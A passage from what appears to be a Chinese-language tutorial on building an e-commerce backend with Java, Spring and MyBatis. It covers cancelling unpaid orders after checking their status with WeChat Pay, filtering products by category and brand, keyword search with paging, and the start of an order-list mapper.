    <span class="hljs-comment">// 需要注意的是，在数据库查询到是 未支付 状态的不一定就一定是未支付，因为支付平台支付成功对服务器响应过程中可能</span>
    <span class="hljs-comment">// 出现意想不到的问题，所以在修改订单状态之前一定要向支付平台确认此订单的状态，若仍然是 未支付 则取消订单</span>
    <span class="hljs-comment">// 取消订单后需要修改订单状态 为支付失败(6)，并向支付平台通知取消支付链接</span>
    <span class="hljs-comment">// 取消订单后，需要恢复商品的库存，就是ProductSku中的stock + OrderItem(订单快照)中的buy_conuts</span>
    <span class="hljs-comment">// 这里需要考虑到数据库的并发问题，需要加锁和事务管理</span>

    
    <span class="hljs-comment">// 1.查询超过三十分钟未支付订单</span>
    <span class="hljs-keyword">try</span>&#123;
        System.out.println(<span class="hljs-string">&quot;1——————————————————————----1&quot;</span>);
        Example example = <span class="hljs-keyword">new</span> Example(Orders.class);
        Example.Criteria criteria = example.createCriteria();
        Date time = <span class="hljs-keyword">new</span> Date(System.currentTimeMillis() - <span class="hljs-number">30</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>);
        criteria.andLessThan(<span class="hljs-string">&quot;createTime&quot;</span>, time);
        List&lt;Orders&gt; orders = ordersMapper.selectByExample(example);
        <span class="hljs-comment">//2.访问微信平台接口，确认当前订单最终的支付状态</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; orders.size(); i++) &#123;
            Orders order = orders.get(i);
            HashMap&lt;String, String&gt; params = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();
            params.put(<span class="hljs-string">&quot;out_trade_no&quot;</span>, order.getOrderId());
            <span class="hljs-comment">// 使用微信支付提供发接口查询订单的支付状态</span>
            Map&lt;String, String&gt; resp = wxPay.orderQuery(params);
            <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;SUCCESS&quot;</span>.equalsIgnoreCase(resp.get(<span class="hljs-string">&quot;trade_state&quot;</span>)))&#123;
                <span class="hljs-comment">//2.1 如果订单已经支付，则修改订单状态为&quot;代发货/已支付&quot;  status = 2</span>
                Orders updateOrder = <span class="hljs-keyword">new</span> Orders();
                updateOrder.setOrderId(order.getOrderId());
                updateOrder.setStatus(<span class="hljs-string">&quot;2&quot;</span>);
                ordersMapper.updateByPrimaryKeySelective(updateOrder);
            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;NOTPAY&quot;</span>.equalsIgnoreCase(resp.get(<span class="hljs-string">&quot;trade_state&quot;</span>)))&#123;
                <span class="hljs-comment">//2.2 如果确实未支付 则取消订单：</span>
                <span class="hljs-comment">//  a.向微信支付平台发送请求，关闭当前订单的支付链接</span>
                Map&lt;String, String&gt; map = wxPay.closeOrder(params);
                System.out.println(map);

                <span class="hljs-comment">// b.关闭订单</span>
                orderService.closeOrder(order.getOrderId());
            &#125;
        &#125;
    &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;
        e.printStackTrace();
    &#125;
&#125;</code></pre>



</li>
</ul>
<h3 id="1-12-根据品牌筛选商品"><a href="#1-12-根据品牌筛选商品" class="headerlink" title="1.12 根据品牌筛选商品"></a>1.12 根据品牌筛选商品</h3><h4 id="获取某个商品的所有品牌"><a href="#获取某个商品的所有品牌" class="headerlink" title="获取某个商品的所有品牌"></a>获取某个商品的所有品牌</h4><ul>
<li><p>sql</p>
<p>首先根据分类的category_id获取该分类下的所有商品，再从这些商品中获取到品牌名称</p>
<pre><code class="hljs mysql">select product_id from product  where category_id&#x3D; cid  

select  select DISTINCT brand  from product_params  where product_id in cids
&#x2F;&#x2F; 合并
select  select DISTINCT brand  from product_params  where product_id in (
	select product_id from product  where category_id&#x3D; cid  
)</code></pre>
</li>
<li><p>dao</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 根据类别id查询此类别下的商品的品牌列表</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> cid</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment"> */</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title">selectBrandByCategoryId</span><span class="hljs-params">(<span class="hljs-keyword">int</span> cid)</span></span>;</code></pre>

<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectBrandByCategoryId&quot;</span> <span class="hljs-attr">resultSets</span>=<span class="hljs-string">&quot;java.util.List&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;String&quot;</span>&gt;</span>
    select DISTINCT brand
    from product_params
    where product_id in (
    select product_id
    from product
    where category_id=#&#123;cid&#125;
    )
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>
</li>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">listBrands</span><span class="hljs-params">(<span class="hljs-keyword">int</span> categoryId)</span> </span>&#123;
    List&lt;String&gt; brands = productMapper.selectBrandByCategoryId(categoryId);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK,<span class="hljs-string">&quot;success&quot;</span>,brands);
&#125;</code></pre>
</li>
<li><p>controller</p>
<pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/listbrands/&#123;cid&#125;&quot;)</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getListBrands</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;cid&quot;)</span> String cid)</span></span>&#123;
    <span class="hljs-keyword">return</span> productService.listBrands(Integer.parseInt(cid));
&#125;</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220716105333765.png" alt="image-20220716105333765"></p>
</li>
</ul>
<h4 id="根据分类和品牌分页查询商品"><a href="#根据分类和品牌分页查询商品" class="headerlink" title="根据分类和品牌分页查询商品"></a>根据分类和品牌分页查询商品</h4><table>
<thead>
<tr>
<th>请求url</th>
<th>响应结果</th>
</tr>
</thead>
<tbody><tr>
<td>product/listbycid/49?pageNum=1&amp;limit=4</td>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220716105625379.png" alt="image-20220716105625379"></td>
</tr>
</tbody></table>
<ul>
<li><p>sql</p>
<p>由响应数据可以看出是分页查询，并且将商品的价格最低的sku一起返回</p>
<pre><code class="hljs mysql">select * from product_sku where prodoct_id &#x3D; 1 ORDER BY  sell_price limit 0,1
select * from product where category_id &#x3D; 49</code></pre>
</li>
<li><p>dao</p>
<pre><code class="hljs java"> * 根据三级分类ID分页查询商品信息
 * <span class="hljs-meta">@param</span> cid 三级分类id
 * <span class="hljs-meta">@param</span> start 起始索引
 * <span class="hljs-meta">@param</span> limit 查询记录数
 * <span class="hljs-meta">@return</span>
 */
<span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;ProductVO&gt; <span class="hljs-title">selectProductByCategoryId</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;cid&quot;)</span> <span class="hljs-keyword">int</span> cid,</span></span>
<span class="hljs-function"><span class="hljs-params">                                                 <span class="hljs-meta">@Param(&quot;start&quot;)</span> <span class="hljs-keyword">int</span> start,</span></span>
<span class="hljs-function"><span class="hljs-params">                                                 <span class="hljs-meta">@Param(&quot;limit&quot;)</span> <span class="hljs-keyword">int</span> limit)</span></span>;</code></pre>

<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ProductVOMap2&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.entity.ProductVO&quot;</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productName&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;root_category_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;rootCategoryId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sold_num&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;soldNum&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_status&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productStatus&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;create_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;createTime&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;update_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;updateTime&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;content&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;LONGVARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;content&quot;</span> /&gt;</span>
  <span class="hljs-comment">&lt;!--  根据商品ID查询价格最低的套餐  --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">collection</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skus&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.dao.ProductSkuMapper.selectLowerestPriceByProductId&quot;</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>
  
<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectProductByCategoryId&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;ProductVOMap2&quot;</span>&gt;</span>
  select  product_id,
          product_name,
          category_id,
          root_category_id,
          sold_num,
          product_status,
          content,
          create_time,
          update_time
  from product
  where category_id=#&#123;cid&#125;
  limit #&#123;start&#125;,#&#123;limit&#125;
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>

<p>selectLowerestPriceByProductId</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.entity.ProductSku&quot;</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuName&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_img&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuImg&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;untitled&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;untitled&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;original_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;originalPrice&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sell_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;sellPrice&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;discounts&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;DECIMAL&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;discounts&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;stock&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;stock&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;create_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;createTime&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;update_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;updateTime&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;status&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;status&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>
  
<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectLowerestPriceByProductId&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span>&gt;</span>
  select  sku_id,product_id,sku_name, sku_img,untitled,original_price,sell_price,
    discounts,stock,create_time,update_time,status
  from product_sku
  where product_id = #&#123;productId&#125;
  ORDER BY  sell_price limit 0,1
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>
</li>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getProductsByCategoryId</span><span class="hljs-params">(<span class="hljs-keyword">int</span> categoryId, <span class="hljs-keyword">int</span> pageNum, <span class="hljs-keyword">int</span> limit)</span> </span>&#123;
    <span class="hljs-comment">//1.查询分页数据</span>
    <span class="hljs-keyword">int</span> start = (pageNum-<span class="hljs-number">1</span>)*limit;
    List&lt;ProductVO&gt; productVOS = productMapper.selectProductByCategoryId(categoryId, start, limit);
    <span class="hljs-comment">//2.查询当前类别下的商品的总记录数</span>
    Example example = <span class="hljs-keyword">new</span> Example(Product.class);
    Example.Criteria criteria = example.createCriteria();
    criteria.andEqualTo(<span class="hljs-string">&quot;categoryId&quot;</span>,categoryId);
    <span class="hljs-keyword">int</span> count = productMapper.selectCountByExample(example);
    <span class="hljs-comment">//3.计算总页数</span>
    <span class="hljs-keyword">int</span> pageCount = count%limit==<span class="hljs-number">0</span>? count/limit : count/limit+<span class="hljs-number">1</span>;
    <span class="hljs-comment">//4.封装返回数据</span>
    PageHelper&lt;ProductVO&gt; pageHelper = <span class="hljs-keyword">new</span> PageHelper&lt;&gt;(count, pageCount, productVOS);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK,<span class="hljs-string">&quot;SUCCESS&quot;</span>,pageHelper);
&#125;</code></pre>
</li>
<li><p>controller</p>
<pre><code class="hljs java"><span class="hljs-meta">@ApiOperation(&quot;商品品牌分页查询接口&quot;)</span>
<span class="hljs-meta">@GetMapping(&quot;/listbycid/&#123;cid&#125;&quot;)</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getProductsByCategoryId</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;cid&quot;)</span> String cid,</span></span>
<span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-meta">@RequestParam(&quot;pageNum&quot;)</span> <span class="hljs-keyword">int</span> pageNum,</span></span>
<span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-meta">@RequestParam(&quot;limit&quot;)</span> <span class="hljs-keyword">int</span> limit)</span></span>&#123;
    <span class="hljs-keyword">return</span> productService.getProductsByCategoryId(Integer.parseInt(cid), pageNum, limit);
&#125;</code></pre>



</li>
</ul>
<p>  <img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220716114341669.png" alt="image-20220716114341669"></p>
<h3 id="1-13-关键字搜索商品"><a href="#1-13-关键字搜索商品" class="headerlink" title="1.13 关键字搜索商品"></a>1.13 关键字搜索商品</h3><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220716114519584.png" alt="image-20220716114519584"></p>
<h4 id="搜索相关商品的品牌"><a href="#搜索相关商品的品牌" class="headerlink" title="搜索相关商品的品牌"></a>搜索相关商品的品牌</h4><ul>
<li><p>dao</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectBrandByKeyword&quot;</span> <span class="hljs-attr">resultSets</span>=<span class="hljs-string">&quot;java.util.List&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;String&quot;</span>&gt;</span>
    select DISTINCT brand
    from product_params
    where product_id in (
    select product_id
    from product
    where product_name like #&#123;kw&#125;
    )
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>
</li>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">listBrands</span><span class="hljs-params">(String kw)</span> </span>&#123;
    kw = <span class="hljs-string">&quot;%&quot;</span>+kw+<span class="hljs-string">&quot;%&quot;</span>;
    List&lt;String&gt; brands = productMapper.selectBrandByKeyword(kw);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK,<span class="hljs-string">&quot;SUCCESS&quot;</span>,brands);
&#125;</code></pre>

</li>
</ul>
<h4 id="搜索出包含关键词的商品"><a href="#搜索出包含关键词的商品" class="headerlink" title="搜索出包含关键词的商品"></a>搜索出包含关键词的商品</h4><ul>
<li><p>dao</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectProductByKeyword&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;ProductVOMap2&quot;</span>&gt;</span>
    select  product_id,
    product_name,
    category_id,
    root_category_id,
    sold_num,
    product_status,
    content,
    create_time,
    update_time
    from product
    where product_name like #&#123;kw&#125;
    limit #&#123;start&#125;,#&#123;limit&#125;
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>
</li>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">searchProduct</span><span class="hljs-params">(String kw, <span class="hljs-keyword">int</span> pageNum, <span class="hljs-keyword">int</span> limit)</span> </span>&#123;
    <span class="hljs-comment">//1.查询搜索结果</span>
    kw = <span class="hljs-string">&quot;%&quot;</span>+kw+<span class="hljs-string">&quot;%&quot;</span>;
    <span class="hljs-keyword">int</span> start = (pageNum-<span class="hljs-number">1</span>)*limit;
    List&lt;ProductVO&gt; productVOS = productMapper.selectProductByKeyword(kw, start, limit);

    <span class="hljs-comment">//2.查询总记录数</span>
    Example example = <span class="hljs-keyword">new</span> Example(Product.class);
    Example.Criteria criteria = example.createCriteria();
    criteria.andLike(<span class="hljs-string">&quot;productName&quot;</span>,kw);
    <span class="hljs-keyword">int</span> count = productMapper.selectCountByExample(example);

    <span class="hljs-comment">//3.计算总页数</span>
    <span class="hljs-keyword">int</span> pageCount = count%limit==<span class="hljs-number">0</span>? count/limit:count/limit+<span class="hljs-number">1</span>;

    <span class="hljs-comment">//4.封装，返回数据</span>
    PageHelper&lt;ProductVO&gt; pageHelper = <span class="hljs-keyword">new</span> PageHelper&lt;&gt;(count, pageCount, productVOS);
    ResultVO resultVO = <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK, <span class="hljs-string">&quot;SUCCESS&quot;</span>, pageHelper);
    <span class="hljs-keyword">return</span> resultVO;
&#125;</code></pre>

</li>
</ul>
<h3 id="1-14-个人中心"><a href="#1-14-个人中心" class="headerlink" title="1.14 个人中心"></a>1.14 个人中心</h3><h4 id="显示所有订单"><a href="#显示所有订单" class="headerlink" title="显示所有订单"></a>显示所有订单</h4><blockquote>
<p>order/list?userId=15&amp;pageNum=1&amp;limit=5&amp;status=1</p>
</blockquote>
<ul>
<li><p>dao</p>
<p>OrdersMapper</p>
<pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;OrdersVO&gt; <span class="hljs-title">selectOrders</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;userId&quot;)</span> String userId,</span></span>
<span class="hljs-function"><span class="hljs-params">                                   <span class="hljs-meta">@Param(&quot;status&quot;)</span> String status,</span></span>
<span class="hljs-function"><span class="hljs-params">                                   <span class="hljs-meta">@Param(&quot;start&quot;)</span> <span class="hljs-keyword">int</span> start,</span></span>
<span class="hljs-function"><span class="hljs-params">                                   <span class="hljs-meta">@Param(&quot;limit&quot;)</span> <span class="hljs-keyword">int</span> limit)</span></span>;</code></pre>

<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;OrdersVOMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.entity.OrdersVO&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;order_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;orderId&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userId&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;untitled&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;untitled&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;receiver_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;receiverName&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;receiver_mobile&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;receiverMobile&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;receiver_address&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;receiverAddress&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;total_amount&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;DECIMAL&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;totalAmount&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;actual_amount&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;actualAmount&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;pay_type&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;payType&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;order_remark&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;orderRemark&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;status&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;status&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;delivery_type&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;deliveryType&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;delivery_flow_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;deliveryFlowId&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;order_freight&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;DECIMAL&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;orderFreight&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;delete_status&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;deleteStatus&quot;</span> /&gt;</span>
